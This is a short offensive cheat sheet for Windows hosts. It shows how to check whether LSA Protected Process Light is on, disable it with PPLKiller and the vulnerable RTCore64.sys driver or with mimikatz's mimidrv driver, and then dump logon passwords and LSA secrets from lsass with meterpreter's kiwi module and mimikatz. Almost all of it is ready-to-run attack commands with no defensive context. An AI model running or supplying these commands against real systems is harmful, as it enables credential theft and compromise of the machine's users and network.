### <ins>Check if PPL is enabled</ins>
CMD: `reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL` - `0x1` means enabled.

## Disable PPL using PPLKiller

Make sure the session you are running with has SYSTEM privleges.
- Place the driver RTCore64.sys at: `C:\Windows\System32\config\systemprofile\AppData\Local\Temp` - The Temp directory might no exist, just create it - `mkdir Temp`.

Now, we will need to install the driver:
- `.\PPLKiller /installDriver`

Then we will disable LSA Protection: 
- `.\PPLKiller.exe /disableLSAProtection`

Now we can use meterpreter mimikatz module to dump the lsass process: 
- `load kiwi` - `creds_all` - `lsa_dump_secrets`

## Disable PPL using mimikatz
Transfer both `mimikatz.exe` and `mimidrv.sys` to the same directory, e.g `C:\Windows\Tasks`.

Dump logonpasswords: 
- `.\mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "sekurlsa::logonpasswords" "exit"`

Dump secrets: 
- `.\mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "lsadump::secrets" "exit"`

Restore: 
- `.\mimikatz.exe "!processprotect /process:lsass.exe" "!-" "exit"`
